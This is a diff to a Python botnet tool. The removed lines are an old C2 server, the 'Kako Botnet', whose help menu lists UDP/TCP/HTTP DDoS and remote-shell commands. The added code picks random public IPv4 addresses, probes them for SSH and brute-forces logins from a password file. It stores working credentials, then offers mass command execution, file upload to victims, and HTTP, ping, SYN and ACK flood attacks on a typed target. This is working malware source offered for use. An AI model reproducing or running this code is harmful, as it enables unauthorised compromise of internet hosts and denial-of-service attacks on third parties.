@@ -1,209 +1,273 @@
-import sys
+import paramiko
 import time
+import random
 import socket
-import threading
-from json import load
-#from urllib2
-#import urlopen
-#from thread import start_new_thread
+import struct
+from ataque import load_ataque
+from ataque import all_bots
+from ataque import list_of_bots
+from ataque import select_bot
+from ataque import single_bot
+from ataque import sftp
+from ataque import bots_alive
+from ataque import delete_list
+from ataque import attack
 
-connect = "" # IP. Leave empty
-conport = 8080 # Your port
-infport = 8888 # Bot port
+USER=[]
+PASS=[]
+total_list=0
 
-clients = 0
-bots = 0
+def load(option):
 
-rankAdmin = "Admin"
-pwordAdmin = "Admin"
+    global total_list
 
-rankGuest = "Guest"
-pwordGuest = "Guest"
+    if option==1:
+        with open("passwords.txt","r") as f:
+            for line in f:
+                USER.append(line.split(":")[0])
+                PASS.append(line.strip("\n").split(":")[1])
+                total_list+=1
+    if option==2:
+        with open("passwords_small.txt","r") as f:
+            for line in f:
+                USER.append(line.split(":")[0])
+                PASS.append(line.strip("\n").split(":")[1])
+                total_list+=1
 
-bc = []
+def conexion(ip, option):
 
-print("Remember to add unwanted IP Addresses into the banned list before anyone starts to connect.")
-print("If it doesn't say both Server and Bot started there is a problem.")
+    equipos=open("equipos.txt","a")
 
-def clientDisconnect():
-	global clients
-	clients = clients - 1
+    for i in range(total_list):
 
-def botDisconnect():
-	global bots
-	bots = bots - 1
-	
-def clientThread(conn):
-	global pwordGuest
-	
-	createBanned = ("banned.txt", "a")
-	banned = ("banned.txt")
-	ip = load(open('http://jsonip.com'))['ip']
-	if ip in banned:
-		conn.send("[!] Your IP Address has been banned.\r\n")
-		conn.send("[>] Please contact live:zerefdragneelbro on skype for this to be removed. [<]\r\n")
-		clientDisconnect()
-		sys.exit()
-	else:
-		pass
+        try:
 
-	def rank(conn):
-		conn.send("admin")
-		return conn.recv(512)
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
 
-	def password(conn):
-		conn.send("admin")
-		return conn.recv(512)
+            message=ssh.connect(ip, username=USER[i], password=PASS[i])
 
-	def nickname(conn):
-		conn.send("admin")
-		return conn.recv(512)
-		print("[>] Welcome to the Kako Botnet [<]\r\n")
-		print("[?] Please use the custom client.py made by Law\r\n")
-		print("[?] Or else it made not work as its been untested with other clients\r\n")
-		print("[?] Type >help for a list of commands [?]\r\n")
-		print("[?] Your nickname is: %s" % nickname)
-		while True:
-			try:
-				message = conn.recv(512)
-				if message:
-					reply = message
-					broadcast(reply, conn)
-				else:
-					remove(conn)
+            print(f'[*] Authentication Worked IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
 
-				logs = ("logs.txt", "a")
-				logs.write("%s:%s:%s - %s\r\n" % (rank, password, nickname, message))
+            equipos.write(f'{ip}:{USER[i]}:{PASS[i]}:NS\n')
+            equipos.close()
 
-				if message.lower().startswith(">help"):
-					conn.sendall("[>] Helpful Info [<]\r\n")
-					conn.sendall("[>] and [<] = Notice\r\n")
-					conn.sendall("[?] = Information\r\n")
-					conn.sendall("[!] = Warning\r\n")
-					conn.sendall("[?] - You can only send 1 attack after another. By that I mean if I sent an attack\r\n")
-					conn.sendall("for 30 seconds you can only send another attack after those 30 seconds\r\n")
-					conn.sendall("\r\n")
-					conn.sendall("[>] Server Commands [<]\r\n")
-					conn.sendall("[?] >help - Displays a help menu like this\r\n")
-					conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
-					conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
-					conn.sendall("\r\n")
-					conn.sendall("[>] Bot Commands [<]\r\n")
-					conn.sendall("[!] Warning! These commands are built into the client made by Law not the server\r\n")
-					conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
-					conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
-					conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
-					conn.sendall("[?] >killbots - Disconnects all bots\r\n")
-					conn.sendall("[?] >shell - Allows the host to use commands from the bots terminal\r\n")
-					if rank.startswith(rankAdmin):
-						conn.sendall("\r\n")
-						conn.sendall("[>] Secret Admin Command [<]\r\n")
-						conn.sendall("[?] >password - Changes guest password for this session only\r\n")
+            ssh.close()
 
-				if message.lower().startswith(">status"):
-					conn.sendall("[+] Clients Connected: %s\r\n" % clients)
-					conn.sendall("[+] Bots Connected: %s\r\n" % bots)
+            break
 
-				if message.lower().startswith(">credits"):
-					conn.sendall("[?] Law - Idea and main Programmer(AKA the guy who made this command)\r\n")
-					conn.sendall("[?] Also coded the client.py file from scratch\r\n")
-					conn.sendall("[?] Picses - Coded the bot connection\r\n")
-					conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
+        except paramiko.ssh_exception.AuthenticationException:
 
-				if message.lower().startswith(">password"):
-					if rank.startswith(rankAdmin):
-						conn.sendall("[>] This will change the password to guest rank for this session only [<]\r\n")
-						def newPass(conn, prefix="New Password: "):
-							conn.send(prefix)
-							return conn.recv(512)
+            print(f'[*] Authentication Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
 
-						newPass = newPass(conn)
-						pwordGuest = newPass
-						conn.sendall("[?] New Guest Password: %s" % pwordGuest)
-			except:
-				break
-			if not message:
-				break
-		clientDisconnect()
-		conn.close()
-		try:
-			ip = load(open('http://jsonip.com'))['ip']
-			fail = ("fails.txt", "a")
-			fail.write("%s:%s:%s:%s\r\n" % (ip, rank, password, nickname))
-			conn.send("[!] Incorrect Information!\r\n")
-			conn.send("[!] Your IP Address has been logged.\r\n")
-			clientDisconnect()
-			time.sleep(3)
-			conn.close()
-		except:
-			clientDisconnect()
-			conn.close
+        except paramiko.SSHException:
 
-def startClient():
-	host = connect
-	port = conport
-	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.bind((host, port))
-	sock.listen(999999)
-	time.sleep(0.10)
-	print("[+] Server Started")
-	while True:
-		global clients
-		time.sleep(1)
-		conn, addr = sock.accept()
-		bc.append(conn)
-		clients = clients + 1
+            print(f'[*] Device Failed Executing the Command IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
+            break
 
-#		start_new_thread(clientThread, (conn,))
-	sock.close()
+        except socket.error:
 
-def bot_thread(conn):
-	while True:
-		try:
-			data = conn.recv(512)
-		except:
-			print("[-] Bot Disconnected")
-			break
-		if not data:
-			pass
-	botDisconnect()
-	conn.close()
+            print(f'[*] Connection Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
+            break
 
-def startBot():
-	host = connect
-	port = infport
-	infsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	infsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	infsock.bind((host, port))
-	infsock.listen(999999)
-	time.sleep(0.5)
-	print("[+] Bot Started")
-	while True:
-		global bots
-		time.sleep(1)
-		conn, addr = infsock.accept()
-		bc.append(conn)
-		bots = bots + 1
+        ssh.close()
 
-#		start_new_thread(bot_thread, (conn,))
-	infsock.close()
+def IP():
 
-def broadcast(message, connection):
-    for bots in bc:
-        if bots != connection:
-            try:
-                bots.sendall(message)
-            except:
-                bots.close()
-                remove(bots)
+    random_ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+    sv=int(random_ip.split(".")[0])
+    sb=int(random_ip.split(".")[1])
+    while(sv==127 or sv==0 or sv==3 or sv==15 or sv==56 or sv==10 or (sv==192 and sb==168) or (sv == 172 and sb >= 16 and sb < 32) or (sv == 100 and sb >= 64 and sb < 127) or (sv==169 and sb>254) or (sv==198 and sb>= 18 and sb<20) or sv>=224 or sv==6 or sv==7 or sv==11 or sv==21 or sv==22 or sv==26 or sv==28 or sv==29 or sv==30 or sv==33 or sv==55 or sv==214 or sv==215):
+        print(f'[*] IP {random_ip} not valid\n')
+        return False
+    print(f'[*] IP {random_ip} valid')
+    return random_ip
 
-def remove(connection):
-    if connection in bc:
-        bc.remove(connection)
+def alive(ip):
+    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    location=(ip,22)
+    a_socket.settimeout(0.05)
 
-client = threading.Thread(target=startClient, args=(""), name='Client Session Handler')
-client.start()
+    result_of_check = a_socket.connect_ex(location)
 
-botnet = threading.Thread(target=startBot, args=(""), name='Bot Session Handler')
-botnet.setDaemon(True)
-botnet.start()
+    if result_of_check == 0:
+        print(f"    +---> {ip} with Port 22 is open\n")
+        a_socket.close()
+        return True
+    else:
+        print(f"    +---> {ip} with Port 22 is not open\n")
+        a_socket.close()
+        return False
+
+def cls(): print("\n"*20)
+
+def none_bots(bot):
+    if bot==0:
+        print("\nNot enough bots to start an attack, Press enter to exit: ")
+        exit(0)
+
+if __name__ == '__main__':
+
+    while 1:
+
+        option=int(input('''
+          ┏━━━┓━━━┓━━━┓
+          ┃┏━┓┃┏━┓┃┏━┓┃
+          ┃┗━┛┃┗━┛┃┗━┛┃
+          ┗━━┓┃━━┓┃━━┓┃
+          ┏━━┛┃━━┛┃━━┛┃
+          ┗━━━┛━━━┛━━━┛
+          ━━━━━━━━━━━━━
+          ━━━━━━━━━━━━━
+
+         1) Bots Alive
+         2) Command Execution
+         3) File Upload   
+         4) HTTP/HTTPS Attack
+         5) PING Attack
+         6) SYN Attack
+         7) ACK Attack
+         8) Scan bots
+         
+[root@999]: $ '''))
+
+        if option==1:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            delete_list()
+            input("\nPress enter to continue...")
+            cls()
+
+        if option==2:
+
+            option2=int(input('''
+          1) Execute the commnand in all your bots
+          2) Execute a commnand in a single bot
+
+[root@999]: $ '''))
+
+            if option2==1:
+                load_ataque()
+                x=bots_alive()
+                none_bots(x)
+                print("REMEMBER! To concatenate commands just add ; ex( ls;pwd;cd ..;pwd )\n")
+                command=input("Select the command that you want to execute in your bots: ")
+                see=input("Would you like to see the outputs of the commands ? y/n: ")
+                print("")
+                all_bots(command, see)
+                delete_list()
+                input("Press enter to continue...")
+                cls()
+
+            if option2==2:
+
+                load_ataque()
+                x=bots_alive()
+                none_bots(x)
+                bot=int(input("\nSelect the number of the bot: "))
+                result=select_bot(bot)
+                print(f'''\n
+Connecting {result[0]}...
+REMEMBER! Press exit to leave the device | To concatenate commands just add ; ex( ls;pwd;cd ..;pwd )\n''')
+
+                while 1:
+                    command=input(f'{result[1]}@{result[0]}:~#')
+                    print("")
+                    if command=='exit':
+                        break
+                    single_bot(command, "y", result[0], result[1], result[2])
+                delete_list()
+                input("Press enter to continue...")
+                cls()
+
+        if option==3:
+
+                load_ataque()
+                x=bots_alive()
+                none_bots(x)
+                bot=int(input("\nSelect the number of the bot: "))
+                result=select_bot(bot)
+
+                localpath=input("Write the LOCAL path file ex( /home/user/program.exe or C://User/file.txt ): ")
+                remotepath=input("Write the REMOTE path file ex( /tmp/yourfile.sh or /home/car.jpg ): ")
+
+                print(f'\nConnecting and Uploading {localpath} to {result[0]}...\n')
+                sftp(result[0], result[1], result[2], remotepath, localpath)
+                delete_list()
+                input("Press enter to continue...")
+                cls()
+
+        if option==4:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nTargetted IP: ")
+            attack(ip, 1, None, None)
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==5:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nTargetted IP: ")
+            attack(ip, 2, None, None)
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==6:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nTargetted IP: ")
+            port=str(input("Port: "))
+            attack(ip, 3, port, "-S")
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==7:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nTargetted IP: ")
+            port=str(input("Port: "))
+            attack(ip, 3, port, "-A")
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==8:
+
+            option=int(input('''
+1) passwords.txt ( a lot of combinations, this file goes slower but it has more combos )
+2) passwords_small.txt ( 4 combinations, this file goes faster but it has less combos )
+Select the option: '''))
+
+            load(option)
+
+            while 1:
+
+                    a=IP()
+
+                    if a==False:
+
+                        continue
+
+                    if alive(a) == True:
+
+                        try:
+
+                            conexion(a,option)
+
+                        except:
+
+                            continue
